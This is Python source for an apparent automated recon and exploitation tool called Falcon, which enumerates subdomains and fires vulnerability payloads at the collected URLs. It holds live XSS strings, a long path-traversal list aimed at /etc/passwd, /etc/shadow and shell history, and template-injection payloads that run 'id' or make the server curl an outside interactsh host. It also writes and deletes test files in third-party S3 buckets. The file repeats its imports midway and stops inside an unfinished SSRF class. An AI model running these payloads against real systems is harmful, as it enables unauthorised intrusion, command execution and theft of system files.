import argparse
import json
import os
import subprocess
import time
from datetime import datetime as date
import logging
import logging_config
import requests
import boto3
from botocore.exceptions import ClientError
from tqdm import tqdm
import dns.resolver

# Import the logger
logger = logging.getLogger("Falcon")


class Colors:
    """Class to define ANSI color codes for terminal output"""

    def __init__(self):
        """Initialize color codes"""
        self.GREEN = "\033[32m"
        self.RED = "\033[31m"
        self.BLUE = "\033[34m"
        self.SKY_BLUE = "\033[38;5;153m"
        self.END = "\033[0m"


color = Colors()

# Banner for the script, displayed at the start
banner = rf"""{color.GREEN}
    ______      __                      __  __            __
   / ____/___ _/ /________  ____  ___  / / / /_  ______  / /____  _____
  / /_  / __ `/ / ___/ __ \/ __ \/ _ \/ /_/ / / / / __ \/ __/ _ \/ ___/
 / __/ / /_/ / / /__/ /_/ / / / /  __/ __  / /_/ / / / / /_/  __/ /
/_/    \__,_/_/\___/\____/_/ /_/\___/_/ /_/\__,_/_/ /_/\__/\___/_/
                                                            Coder: OctaYus0x01
                                                            https://github.com/octayus
                                                                                            {color.END}
"""

print(banner)


def loading_animation(task):
    """
    Decorator to display a loading animation while a function executes

    Args:
        task (str): Description of the task being performed

    Returns:
        function: Decorated function with loading animation
    """

    def decorator(func):
        def wrapper(*args, **kwargs):
            with tqdm(
                total=100,
                desc=task,
                bar_format="{l_bar}{bar} | {n_fmt}/{total_fmt} [{elapsed}]",
            ) as pbar:
                for _ in range(100):
                    time.sleep(0.02)  # Simulating task progress
                    pbar.update(1)
                result = func(*args, **kwargs)
            return result

        return wrapper

    return decorator


class MakeDirectories:
    """Class to handle directory creation for scan results"""

    def __init__(self, output_file):
        """
        Initialize with output directory path

        Args:
            output_file (str): Path to output directory
        """
        self.output_file = output_file

    @loading_animation(f"{color.GREEN}[+] Creating directories{color.END}")
    def mk_dirs(self):
        """Create directory structure for scan results"""
        try:
            # Validate output_file
            if not self.output_file:
                logger.error(
                    f"{color.RED}Error: Output directory not specified. Please provide an output directory with -o or --output.{color.END}"
                )
                return

            # Create the main output directory
            if not os.path.isdir(self.output_file):  # True
                os.makedirs(self.output_file)
            dirs_list = ["hosts", "urls", "js", "vuln"]

            # Create subdirectories
            for d in dirs_list:
                os.makedirs(os.path.join(self.output_file, d), exist_ok=True)
                time.sleep(0.02)
                logger.info(
                    f"{color.GREEN}[+] {d} Directory successfully created{color.END}"
                )

            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")

            # Create files in the 'hosts' directory
            hosts_files = [
                "alive-hosts.txt",
                "httpx.txt",
                "subs.txt",
                "https-alive.txt",
                "asn.txt",
                "cnames.txt",
            ]
            for f in hosts_files:
                open(os.path.join(f"{self.output_file}/hosts/", f), "w").close()
                time.sleep(0.02)
                logger.info(
                    f"{color.SKY_BLUE}[+] {f} File successfully created{color.END}"
                )

            # Create files in the 'urls' directory
            urls_files = [
                "all-urls.txt",
                "filtered-urls.txt",
                "js-files.txt",
                "leaked-docs.txt",
                "params.txt",
                "gf-xss.txt",
                "gf-ssrf.txt",
                "gf-lfi.txt",
                "gf-ssrf.txt",
                "gf-ssti.txt",
                "gf-sqli.txt",
            ]
            for u in urls_files:
                open(os.path.join(f"{self.output_file}/urls/", u), "w").close()
                time.sleep(0.02)
                logger.info(
                    f"{color.SKY_BLUE}[+] {u} File successfully created{color.END}"
                )

            # Create files in the 'vuln' directory
            vuln_files = [
                "nuclei-output.txt",
                "nuclei-dast-output.txt",
                "xss.txt",
                "lfi.txt",
                "ssrf.txt",
                "sqli.txt",
                "ssti.txt",
                "js-findings.txt",
                "missing-dmarc.json",
                "origin-ips.json",
                "s3-buckets.json",
                "ips.txt",
                "alive-ips.txt",
                "xss_output.txt",
                "takeovers.json",
                "mantra.txt",
                "expanded-ips.txt",
                "subzy.txt",
                "subjack.txt",
                "open_redirect.txt",
                "lfi-map.txt",
                "openredirex.txt",
                "aws_vuln_bucket.txt",
                "clickjacking.txt",
                "lfi-urls.txt",
                "lfi-subs.txt",
                "semgrep-findings.json",
            ]
            for v in vuln_files:
                open(os.path.join(f"{self.output_file}/vuln/", v), "w").close()
                time.sleep(0.02)
                logger.info(
                    f"{color.SKY_BLUE}[+] {v} File successfully created{color.END}"
                )

        except Exception as e:
            logger.exception(f"{color.RED}Error creating directories: {e}{color.END}")


class SubdomainsCollector:
    """Class to collect and probe subdomains"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def subfinder_subs(self):
        """Use subfinder to enumerate subdomains"""
        domains = self.domains
        output = f"{self.output_file}/hosts/subs.txt"
        try:
            if os.path.isfile(output):
                subfinder_cmd = ["subfinder", "-dL", domains, "-all", "-o", output]
                logger.info(f"{color.GREEN}(+) Subdomain enumeration{color.END}")
                subprocess.run(subfinder_cmd)
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

    def probe(self):
        """Probe subdomains to check which are alive using httpx"""
        subdomains_file = f"{self.output_file}/hosts/subs.txt"
        httpx_output = f"{self.output_file}/hosts/httpx.txt"
        alive_output = f"{self.output_file}/hosts/alive-hosts.txt"
        try:
            httpx_cmd = [
                "httpx",
                "-l",
                subdomains_file,
                "-sc",
                "-title",
                "-fr",
                "-o",
                httpx_output,
            ]
            awk = "'{print $1}'"
            logger.info(f"{color.GREEN}(+) Probing alive hosts{color.END}")
            subprocess.run(httpx_cmd)
            subprocess.run(
                f"cat {httpx_output} | awk {awk} | tee -a {alive_output}",
                check=True,
                shell=True,
            )

        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")


class DmarcFinder:
    """Class to check for DMARC and SPF records"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def check_spf(self, domain):
        """
        Check if SPF record exists for a domain

        Args:
            domain (str): Domain to check

        Returns:
            bool: True if SPF record exists, False otherwise
        """
        try:
            answers = dns.resolver.resolve(domain, "TXT")
            for record in answers:
                if record.to_text().startswith('"v=spf1'):
                    return True
            return False
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            return False
        except Exception as e:
            logger.exception(f"Error checking SPF for {domain}: {e}")
            return False

    def check_dmarc(self, domain):
        """
        Check if DMARC record exists for a domain

        Args:
            domain (str): Domain to check

        Returns:
            bool: True if DMARC record exists, False otherwise
        """
        try:
            answers = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
            for record in answers:
                if record.to_text().startswith('"v=DMARC1'):
                    return True
            return False
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            return False
        except Exception as e:
            logger.exception(f"Error checking DMARC for {domain}: {e}")
            return False

    def validate_domains(self):
        """Validate DMARC and SPF records for all domains in the input file"""
        logger.info(f"{color.GREEN}(+) Checking for DMARC, SPF records{color.END}")
        try:
            with open(self.domains, "r") as file:
                domains_list = file.read().splitlines()

            results = []
            for domain in tqdm(domains_list, desc="Checking DMARC/SPF"):
                spf_valid = self.check_spf(domain)
                dmarc_valid = self.check_dmarc(domain)

                result = {
                    "domain": domain,
                    "spf_valid": spf_valid,
                    "dmarc_valid": dmarc_valid,
                    "status": "Valid" if spf_valid and dmarc_valid else "Vulnerable",
                }
                results.append(result)

            output_json = f"{self.output_file}/vuln/missing-dmarc.json"
            with open(output_json, "w") as f_out:
                json.dump(results, f_out, indent=4)

            logger.info(
                f"{color.GREEN}[+] DMARC and SPF check completed and results saved to {output_json}{color.END}"
            )
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")

        except Exception as e:
            logger.exception(
                f"{color.RED}Error in validate_domains method: {e}{color.END}"
            )


class SubdomainTakeOver:
    """Class to check for potential subdomain takeovers"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def get_cname(self):
        """Get CNAME records for all subdomains"""
        logger.info(
            f"{color.GREEN}(+) CNAME analysis for possible takeovers{color.END}"
        )
        output = f"{self.output_file}/hosts/cnames.txt"
        subdomains_file = f"{self.output_file}/hosts/subs.txt"

        try:
            with open(subdomains_file, "r") as file:
                subdomains = file.read().splitlines()

            with open(output, "w") as out_file:
                for subdomain in subdomains:
                    try:
                        answers = dns.resolver.resolve(subdomain, "CNAME")
                        for cname_data in answers:
                            cname = cname_data.target.to_text()
                            out_file.write(f"{subdomain} > {cname}\n")
                            logger.info(
                                f"{color.GREEN}{subdomain} > {cname}{color.END}\n"
                            )
                    except dns.resolver.NoAnswer:
                        logger.info(
                            f"{color.RED}No CNAME record found for {subdomain}{color.END}\n"
                        )
                    except dns.resolver.NXDOMAIN:
                        logger.warning(
                            f"{color.SKY_BLUE}{subdomain} does not exist{color.END}\n"
                        )
                    except Exception as e:
                        logger.error(
                            f"{color.RED}Error checking CNAME for {subdomain}: {e}{color.END}\n"
                        )

        except Exception as e:
            logger.exception(
                f"{color.RED}Error reading subdomains file: {e}{color.END}"
            )


import json
import requests
import boto3
from botocore.exceptions import ClientError
import logging

logger = logging.getLogger("Falcon")


class Colors:
    """Class to define ANSI color codes for terminal output"""
    def __init__(self):
        self.GREEN = "\033[32m"
        self.RED = "\033[31m"
        self.BLUE = "\033[34m"
        self.SKY_BLUE = "\033[38;5;153m"
        self.END = "\033[0m"


color = Colors()


class BucketFinder:
    """Class to find and test S3 buckets for misconfigurations"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file
        self.vulnerable_buckets = []
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "S3Scanner/1.0"})

        logger.info(f"{color.GREEN}Initialising BucketFinder...{color.END}")

        try:
            self.s3_client = boto3.client("s3")
            self.boto3_available = True
            logger.info(f"{color.GREEN}boto3 client initialised successfully{color.END}")
        except Exception as e:
            self.boto3_available = False
            logger.warning(f"{color.RED}boto3 initialisation failed: {e}{color.END}")

    def buckets_cli(self):
        """Main method to extract AWS CNAMEs and test buckets"""
        try:
            cnames_file = f"{self.output_file}/hosts/cnames.txt"
            aws_cnames_output = f"{self.output_file}/hosts/aws_cnames.txt"

            logger.info(f"{color.SKY_BLUE}Reading CNAMEs from {cnames_file}{color.END}")

            with open(cnames_file, "r") as infile, open(aws_cnames_output, "w") as outfile:
                for line in infile:
                    parts = line.strip().split()
                    if len(parts) >= 3 and "s3" in parts[2] and "amazonaws" in parts[2]:
                        bucket = parts[2].strip(".")
                        outfile.write(bucket + "\n")
                        logger.debug(f"{color.BLUE}Found AWS CNAME: {bucket}{color.END}")

            logger.info(f"{color.SKY_BLUE}Starting to test bucket permissions...{color.END}")
            self.test_bucket_permissions(aws_cnames_output)

        except Exception as e:
            logger.exception(f"{color.RED}Error in buckets_cli: {e}{color.END}")

    def test_bucket_permissions(self, aws_cnames_file):
        """Test S3 buckets using HTTP and optionally boto3"""
        try:
            vuln_txt_path = f"{self.output_file}/vuln/aws_vuln_buckets.txt"
            json_output_path = f"{self.output_file}/vuln/s3-buckets.json"

            logger.info(f"{color.SKY_BLUE}Testing bucket permissions listed in {aws_cnames_file}{color.END}")

            with open(aws_cnames_file, "r") as f, open(vuln_txt_path, "w") as vuln_file:
                for line in f:
                    bucket_url = line.strip()
                    if not bucket_url:
                        continue

                    bucket_name = bucket_url.split(".")[0]
                    logger.debug(f"{color.BLUE}Testing bucket: {bucket_name}{color.END}")

                    result = self.test_single_bucket(bucket_name, bucket_url)

                    if result["vulnerable"]:
                        vuln_types = [k for k, v in result["permissions"].items() if v]
                        msg = f"{color.RED}[+] {bucket_url} -> VULNERABLE -> {', '.join(vuln_types)}{color.END}"
                        logger.warning(msg)
                    else:
                        msg = f"{color.GREEN}[-] {bucket_url} -> Secure{color.END}"
                        logger.info(msg)

                    vuln_file.write(msg + "\n")
                    self.vulnerable_buckets.append(result)

            with open(json_output_path, "w") as json_file:
                json.dump(self.vulnerable_buckets, json_file, indent=2)
                logger.info(f"{color.GREEN}Saved JSON results to {json_output_path}{color.END}")

        except Exception as e:
            logger.exception(f"{color.RED}Error testing bucket permissions: {e}{color.END}")

    def test_single_bucket(self, bucket_name, bucket_url):
        """Test permissions for a single bucket"""
        permissions = {
            "listable": False,
            "readable": False,
            "writable": False,
            "deletable": False,
        }

        # HTTP checks
        try:
            r = self.session.get(f"http://{bucket_url}", timeout=10)
            if r.status_code == 200:
                if "<ListBucketResult" in r.text:
                    permissions["listable"] = True
                else:
                    permissions["readable"] = True
        except requests.RequestException as e:
            logger.debug(f"{color.RED}HTTP GET failed for {bucket_url}: {e}{color.END}")

        # HTTP write/delete test
        test_file = f"test_{bucket_name}.txt"
        test_put_url = f"http://{bucket_name}.s3.amazonaws.com/{test_file}"
        try:
            put_resp = self.session.put(test_put_url, data="test", timeout=10)
            if put_resp.status_code in [200, 201]:
                permissions["writable"] = True
                try:
                    del_resp = self.session.delete(test_put_url, timeout=5)
                    if del_resp.status_code == 204:
                        permissions["deletable"] = True
                except requests.RequestException:
                    pass
        except requests.RequestException as e:
            logger.debug(f"{color.RED}HTTP PUT/DELETE failed for {bucket_name}: {e}{color.END}")

        # boto3 checks if available
        if self.boto3_available:
            try:
                self.s3_client.list_objects_v2(Bucket=bucket_name, MaxKeys=1)
                permissions["listable"] = True
            except ClientError as e:
                logger.debug(f"{color.RED}boto3 list_objects_v2 failed for {bucket_name}: {e}{color.END}")

            try:
                test_key = f"boto3_test_{bucket_name}.txt"
                self.s3_client.put_object(Bucket=bucket_name, Key=test_key, Body="test")
                permissions["writable"] = True
                try:
                    self.s3_client.delete_object(Bucket=bucket_name, Key=test_key)
                    permissions["deletable"] = True
                except ClientError as e:
                    logger.debug(f"{color.RED}boto3 delete_object failed for {bucket_name}: {e}{color.END}")
            except ClientError as e:
                logger.debug(f"{color.RED}boto3 put_object failed for {bucket_name}: {e}{color.END}")

        return {
            "bucket_name": bucket_name,
            "bucket_url": bucket_url,
            "permissions": permissions,
            "vulnerable": any(permissions.values()),
            "tested_with": "boto3+http" if self.boto3_available else "http-only",
        }



class UrlFinder:
    """Class to find and analyze URLs from target domains"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file
        self.js_output = f"{self.output_file}/urls/js-files.txt"
        self.leaked_docs = f"{self.output_file}/urls/leaked-docs.txt"
        self.mantra_output = f"{self.output_file}/urls/mantra-output.txt"
        self.js_findings = f"{self.output_file}/urls/js-findings.txt"

    def collect_urls(self):
        """Collect URLs from various sources (wayback, gau, etc)"""
        subdomains_file = f"{self.output_file}/hosts/subs.txt"
        urls = f"{self.output_file}/urls/all-urls.txt"

        try:
            logger.info(f"{color.GREEN}(+) Collecting all URLs{color.END}")
            commands = [
                f"cat {subdomains_file} | waybackurls | anew {urls}",
                f"cat {subdomains_file} | gau --subs | anew {urls}",
                f"cat {subdomains_file} | gauplus | anew {urls}",
                f"cat {urls} | grep '\\.js$' | anew {self.js_output}",
            ]
            for cmd in commands:
                subprocess.run(cmd, shell=True, check=True)
            gf_list = ["xss", "ssrf", "lfi", "sqli", "ssti"]
            gf_output = f"{self.output_file}/urls/"
            for gf in gf_list:
                subprocess.run(
                    f"cat {urls} | gf {gf} | anew {gf_output}gf-{gf}.txt",
                    shell=True,
                    check=True,
                )

        except Exception as e:
            logger.exception(
                f"{color.RED}Error occurred during URL collection: {e}{color.END}"
            )

    def extract_js_files(self):
        """Extract JavaScript files from collected URLs"""
        try:
            logger.info(f"{color.GREEN}[+] Extracting JS files...{color.END}")
            js_command = f"grep '\\.js$' {self.js_output} | anew {self.js_output}"
            subprocess.run(js_command, shell=True, check=True)
            logger.info(
                f"{color.GREEN}[+] Completed: JS files saved to {self.js_output}{color.END}"
            )
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

    def extract_documents(self):
        """Extract document and backup files from collected URLs"""
        try:
            logger.info(
                f"{color.GREEN}[+] Extracting documents and backup files...{color.END}"
            )
            doc_file_types = r"\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar"
            doc_command = f"grep -E '{doc_file_types}' {self.output_file}/urls/all-urls.txt | anew {self.leaked_docs}"
            subprocess.run(doc_command, shell=True, check=True)
            logger.info(
                f"{color.GREEN}[+] Completed: Sensitive documents saved to {self.leaked_docs}{color.END}"
            )
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

    def download_and_scan_js(self):
        """Download JavaScript files and scan them with Semgrep"""
        js_dir = f"{self.output_file}/js/"
        os.makedirs(js_dir, exist_ok=True)
        try:
            logger.info(f"{color.GREEN}[+] Downloading JavaScript files...{color.END}")
            with open(self.js_output, "r") as file:
                urls = file.read().splitlines()
            downloaded_files = []
            for url in urls:
                try:
                    response = requests.get(url)
                    if response.status_code == 200:
                        filename = os.path.join(
                            js_dir, os.path.basename(url.split("?")[0])
                        )
                        with open(filename, "wb") as js_file:
                            js_file.write(response.content)
                        downloaded_files.append(filename)
                        logger.info(f"{color.GREEN}[+] Downloaded: {url}{color.END}")
                    else:
                        logger.exception(
                            f"{color.RED}[-] Failed to download: {url} (Status {response.status_code}){color.END}"
                        )
                except requests.exceptions.RequestException as e:
                    logger.error(
                        f"{color.RED}[-] Error downloading {url}: {e}{color.END}"
                    )
            # If no files were downloaded, skip Semgrep
            if not downloaded_files:
                logger.info(
                    f"{color.RED}[-] No JavaScript files were downloaded. Skipping Semgrep.{color.END}"
                )
                return
            logger.info(
                f"{color.GREEN}[+] Running Semgrep on downloaded JS files...{color.END}"
            )
            semgrep_command = f"semgrep --config=p/javascript --json --output {self.output_file}/vuln/semgrep-findings.json {js_dir}"
            subprocess.run(semgrep_command, shell=True, check=True)
            logger.info(
                f"{color.GREEN}[+] Completed: Semgrep findings saved to {self.output_file}/vuln/semgrep-findings.json{color.END}"
            )
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

    def extract_js_data_with_mantra(self):
        """Extract data from JavaScript files using Mantra"""
        try:
            logger.info(
                f"{color.GREEN}[+] Extracting data from JS files using Mantra...{color.END}"
            )
            mantra_command = (
                f"cat {self.js_output} | mantra | anew {self.mantra_output}"
            )
            subprocess.run(mantra_command, shell=True, check=True)

            findings_command = (
                f"cat {self.mantra_output} | grep '[+]' | anew {self.js_findings}"
            )
            subprocess.run(findings_command, shell=True, check=True)
            logger.info(
                f"{color.GREEN}[+] Completed: Mantra JS findings saved to {self.js_findings}{color.END}"
            )
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")


class XSS:
    """Class to test for Cross-Site Scripting (XSS) vulnerabilities"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def xss_cli(self):
        """Test for XSS vulnerabilities using common payloads"""
        try:
            xss_urls = f"{self.output_file}/urls/gf-xss.txt"
            xss_output = f"{self.output_file}/vuln/xss_output.txt"
            xss_payloads = [
                '"><svg/onload=alert(1337)>',
                '"><img src=x onerror=alert()>',
                '"><script>alert()</script>',
            ]
            for xss_test in xss_payloads:
                logger.info(
                    f"{color.GREEN}(+) Testing for xss via CLI{color.END}\n{color.SKY_BLUE}(+) Testing payload: {xss_test}{color.END}"
                )
                subprocess.run(
                    f"cat {xss_urls} | qsreplace '{xss_test}' | freq | grep -iv 'Not Vulnerable' | tee -a {xss_output}",
                    shell=True,
                    check=True,
                )
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

class OpenRedirect:
    """Class to test for Open Redirect vulnerabilities using OpenRedireX"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory
        
        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def openredirex(self):
        """Test for Open Redirect vulnerabilities in two phases"""
        try:
            # Phase 1: Scan domains directly
            domains_output = f"{self.output_file}/open_redirect_domains.txt"
            phase1_cmd = (
                f'cat {self.domains} | openredirex -c 50 | anew {domains_output}'
            )
            subprocess.run(phase1_cmd, shell=True, check=True)
            logger.info(f"{color.GREEN}(+) Phase 1 complete: Domain scan results saved to {domains_output}{color.END}")

            # Phase 2: Scan all URLs
            urls = f"{self.output_file}/urls/all-urls.txt"
            urls_output = f"{self.output_file}/vuln/open-redirect.txt"
            
            # Create vuln directory if it doesn't exist
            os.makedirs(os.path.dirname(urls_output), exist_ok=True)
            
            phase2_cmd = (
                f'cat {urls} | openredirex -c 50 | anew {urls_output}'
            )
            subprocess.run(phase2_cmd, shell=True, check=True)
            logger.info(f"{color.GREEN}(+) Phase 2 complete: URL scan results saved to {urls_output}{color.END}")

        except subprocess.CalledProcessError as e:
            logger.error(f"{color.RED}(!) Command failed with exit code {e.returncode}{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}(+) Unexpected error occurred: {e}{color.END}")


class LFI:
    """Class to test for Local File Inclusion vulnerabilities"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def lfi_cli(self):
        """Test for LFI vulnerabilities using common payloads"""
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../etc/passwd%00",
            "../../../../../etc/passwd%2500",
            "../../../../../etc/passwd%00.jpg",
            "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%255c..%255c..%255c..%255cetc%255cpasswd",
            "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
            "../../../../../var/log/apache2/access.log",
            "../../../../../var/log/nginx/access.log",
            "../../../../../var/mail/root",
            "../../../../../root/.bash_history",
            "../../../../../home/user/.bash_history",
            "../../../../../proc/self/environ",
            "../../../../../../../../../../../../../../etc/passwd",
            "..%2F" * 10 + "etc%2Fpasswd",
            "%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
            "/..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/../../../../../../../../../../../etc/shadow",
            "../../../../../../../../../../../../../dev/null",
            "../../../../../../../../../../../../../boot.ini",
            "../../../../../../../../../../../../../windows/system.ini",
            "..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini",
            "../../../../../../../../../../../../../etc/mysql/my.cnf",
            "..%2F..%2F..%2F..%2F..%2Fvar%2Fspool%2Fmail%2Froot",
            "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fproc%2Fself%2Fenviron",
            "%2F..%255c..%255c..%255c..%255cwindows%255csystem.ini",
            "..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2523",
            "%2E%2E%5C%2E%2E%5C%2E%2E%5C%2E%2E%5Cwindows%5Cwin.ini",
        ]

        try:
            urls = f"{self.output_file}/urls/gf-lfi.txt"
            subdomains = f"{self.output_file}/hosts/alive-hosts.txt"
            output_urls = f"{self.output_file}/vuln/lfi-urls.txt"
            output_subdomains = f"{self.output_file}/vuln/lfi-subs.txt"

            logger.info(f"{color.GREEN}(+) Testing subdomains for LFI...{color.END}")
            for payload in lfi_payloads:
                cmd_subs = f"cat {subdomains} | qsreplace '{payload}' | httpx -silent --random-agent -mc 200 -mr 'root:[x*]:0:0:' >> {output_subdomains}"
                subprocess.run(cmd_subs, shell=True)

            logger.info(f"{color.GREEN}(+) Testing URLs for LFI...{color.END}")
            for payload in lfi_payloads:
                cmd_urls = f"cat {urls} | qsreplace '{payload}' | httpx -silent --random-agent -mc 200 -mr 'root:[x*]:0:0:' >> {output_urls}"
                subprocess.run(cmd_urls, shell=True)

        except Exception as e:
            logger.exception(
                f"{color.RED}(-) Error occurred during LFI scan: {e}{color.END}"
            )


class SSTI:
    """Class to test for Server-Side Template Injection vulnerabilities"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file
        self.payloads = self._load_payloads()
        
    def _load_payloads(self):
        """Load SSTI payloads for different template engines"""
        return {
            'basic': [
                '{{7*7}}',                   # Basic template test
                '{{1337*2}}',                # Another arithmetic test
                '{# comment #}',             # Comment test
                '${7*7}',                    # Java-style
                '#{7*7}',                    # Ruby-style
                '<%= 7*7 %>',                # ERB-style
                '${{7*7}}',                  # Spring EL
                '@(7*7)',                    # Razor
                '{{=7*7}}',                  # Mustache
            ],
            'jinja2': [
                '{% for x in (1,2,3) %}{{x}}{% endfor %}',
                '{{ config.items() }}',
                '{{ self.__dict__ }}',
                '{% print(1337*2) %}',
            ],
            'twig': [
                '{{_self.env.registerUndefinedFilterCallback("exec")}}',
                '{{_self.env.getFilter("id")}}',
            ],
            'django': [
                '{% debug %}',
                '{% include "file.txt" %}',
                '{% load static %}{% static "file.txt" %}',
            ],
            'ruby': [
                '<%= system("id") %>',
                '<%= Dir.entries("/") %>',
                '<%= File.open("/etc/passwd").read %>',
            ],
            'smarty': [
                '{system("id")}',
                '{php}echo `id`;{/php}',
            ],
            'velocity': [
                '#set($exec=""){{$exec.class.forName("java.lang.Runtime").getRuntime().exec("id")}}',
            ],
            'freemarker': [
                '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
            ]
        }

    def ssti_cli(self):
        """Test for SSTI vulnerabilities using comprehensive payloads"""
        try:
            ssti_urls = f"{self.output_file}/urls/gf-ssti.txt"
            ssti_output = f"{self.output_file}/vuln/ssti_output.txt"
            
            # Ensure output directory exists
            os.makedirs(os.path.dirname(ssti_output), exist_ok=True)
            
            # Test each category of payloads
            for engine, payloads in self.payloads.items():
                logger.info(
                    f"{color.GREEN}(+) Testing for {engine.upper()} SSTI{color.END}"
                )
                
                for payload in payloads:
                    logger.debug(
                        f"{color.SKY_BLUE}(*) Testing payload: {payload}{color.END}"
                    )
                    
                    # Use httpx for more reliable detection
                    cmd = [
                        'bash', '-c',
                        f"cat {ssti_urls} | qsreplace '{payload}' | "
                        f"httpx -silent -random-agent -timeout 5 -retries 2 -match-regex '49|2674|1337|root:' "
                        f"-mr '49|2674|1337|root:' -json | jq -r '.url' | anew {ssti_output}"
                    ]
                    
                    try:
                        subprocess.run(
                            cmd,
                            check=True,
                            timeout=30,
                            stderr=subprocess.PIPE
                        )
                    except subprocess.TimeoutExpired:
                        logger.warning(f"Timeout testing payload: {payload}")
                    except subprocess.CalledProcessError as e:
                        logger.debug(f"Error with payload {payload}: {e.stderr.decode().strip()}")
            
            # Additional check for blind SSTI using out-of-band detection
            self._test_blind_ssti(ssti_urls, ssti_output)
            
            # Analyze results
            self._analyze_results(ssti_output)
            
        except Exception as e:
            logger.exception(f"{color.RED}Error in SSTI testing: {e}{color.END}")
            return False
        return True

    def _test_blind_ssti(self, input_file, output_file):
        """Test for blind SSTI using out-of-band techniques"""
        try:
            logger.info(f"{color.GREEN}(+) Testing for blind SSTI{color.END}")
            
            # Using interactsh for blind detection
            blind_payloads = [
                '{{request.application.__globals__.__builtins__.__import__("os").popen("curl %s").read()}}',
                '{% for x in ().__class__.__base__.__subclasses__() %}{% if "Popen" in x.__name__ %}{{ x("curl %s", shell=True, stdout=-1).communicate()[0] }}{% endif %}{% endfor %}',
                '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("curl %s") }',
            ]
            
            # Generate unique interactsh URL
            interactsh_cmd = "interactsh-client -v -json 2>/dev/null | jq -r '.correlation_id' | head -1"
            result = subprocess.run(interactsh_cmd, shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                logger.warning("Failed to generate interactsh URL")
                return
                
            interactsh_url = result.stdout.strip()
            if not interactsh_url:
                logger.warning("Empty interactsh URL")
                return
                
            full_url = f"https://{interactsh_url}"
            
            for payload_template in blind_payloads:
                payload = payload_template % full_url
                cmd = [
                    'bash', '-c',
                    f"cat {input_file} | qsreplace '{payload}' | "
                    f"httpx -silent -random-agent -timeout 10 -retries 1 | "
                    f"anew {output_file}.blind"
                ]
                subprocess.run(cmd, check=True)
                
            logger.info(f"{color.GREEN}Monitor for interactions at: {full_url}{color.END}")
            
        except Exception as e:
            logger.error(f"{color.RED}Error in blind SSTI testing: {e}{color.END}")

    def _analyze_results(self, results_file):
        """Analyze and summarize SSTI results"""
        try:
            if not os.path.exists(results_file):
                logger.warning(f"No SSTI results found at {results_file}")
                return
                
            with open(results_file, 'r') as f:
                vuln_urls = f.read().splitlines()
                
            if not vuln_urls:
                logger.info(f"{color.GREEN}No SSTI vulnerabilities found{color.END}")
                return
                
            logger.info(f"{color.RED}[!] Found {len(vuln_urls)} potentially vulnerable URLs:{color.END}")
            for url in vuln_urls[:10]:  # Show first 10 for brevity
                logger.info(f"{color.RED}  - {url}{color.END}")
                
            if len(vuln_urls) > 10:
                logger.info(f"{color.RED}  ... and {len(vuln_urls)-10} more{color.END}")
                
        except Exception as e:
            logger.error(f"{color.RED}Error analyzing results: {e}{color.END}")


class SSRF:
    """Class to test for Server-Side Request Forgery vulnerabilities"""

    def __init__(self, domains, output_file):
        """
